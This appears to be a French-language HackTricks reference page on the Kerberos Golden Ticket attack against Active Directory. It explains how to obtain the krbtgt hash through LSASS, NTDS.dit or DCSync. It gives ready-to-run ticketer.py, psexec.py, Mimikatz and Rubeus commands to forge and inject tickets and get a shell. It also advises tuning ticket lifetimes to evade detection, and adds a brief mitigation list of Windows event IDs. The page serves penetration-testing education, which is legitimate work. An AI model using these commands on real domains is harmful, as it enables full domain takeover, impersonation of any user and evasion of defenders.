# Golden Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Golden ticket

Une attaque **Golden Ticket** consiste en la **création d'un Ticket Granting Ticket (TGT) légitime en usurpant n'importe quel utilisateur** grâce à l'utilisation du **hash NTLM du compte krbtgt de l'Active Directory (AD)**. Cette technique est particulièrement avantageuse car elle **permet d'accéder à n'importe quel service ou machine** au sein du domaine en tant qu'utilisateur usurpé. Il est crucial de se rappeler que les **identifiants du compte krbtgt ne sont jamais mis à jour automatiquement**.

Pour **acquérir le hash NTLM** du compte krbtgt, diverses méthodes peuvent être employées. Il peut être extrait du **processus Local Security Authority Subsystem Service (LSASS)** ou du **fichier NT Directory Services (NTDS.dit)** situé sur n'importe quel contrôleur de domaine (DC) au sein du domaine. De plus, **exécuter une attaque DCsync** est une autre stratégie pour obtenir ce hash NTLM, qui peut être réalisée à l'aide d'outils tels que le **module lsadump::dcsync** dans Mimikatz ou le **script secretsdump.py** par Impacket. Il est important de souligner que pour entreprendre ces opérations, **des privilèges d'administrateur de domaine ou un niveau d'accès similaire sont généralement requis**.

Bien que le hash NTLM serve de méthode viable à cet effet, il est **fortement recommandé** de **forger des tickets en utilisant les clés Kerberos Advanced Encryption Standard (AES) (AES128 et AES256)** pour des raisons de sécurité opérationnelle.

{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Depuis Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Une fois** que vous avez le **golden Ticket injecté**, vous pouvez accéder aux fichiers partagés **(C$)**, et exécuter des services et WMI, donc vous pourriez utiliser **psexec** ou **wmiexec** pour obtenir un shell (il semble que vous ne pouvez pas obtenir un shell via winrm).

### Contournement des détections courantes

Les moyens les plus fréquents de détecter un golden ticket sont en **inspectant le trafic Kerberos** sur le réseau. Par défaut, Mimikatz **signe le TGT pour 10 ans**, ce qui se démarquera comme anormal dans les demandes TGS ultérieures faites avec celui-ci.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Utilisez les paramètres `/startoffset`, `/endin` et `/renewmax` pour contrôler le décalage de départ, la durée et le nombre maximum de renouvellements (tous en minutes).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Malheureusement, la durée de vie du TGT n'est pas enregistrée dans les 4769, donc vous ne trouverez pas cette information dans les journaux d'événements Windows. Cependant, ce que vous pouvez corréler est **voir des 4769 sans un précédent 4768**. Il est **impossible de demander un TGS sans un TGT**, et s'il n'y a aucun enregistrement d'un TGT émis, nous pouvons en déduire qu'il a été forgé hors ligne.

Pour **contourner cette détection**, vérifiez les tickets diamond :

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Atténuation

* 4624 : Connexion de compte
* 4672 : Connexion administrateur
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

D'autres petites astuces que les défenseurs peuvent faire est **d'alerter sur les 4769 pour les utilisateurs sensibles** tels que le compte administrateur de domaine par défaut.

## Références
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
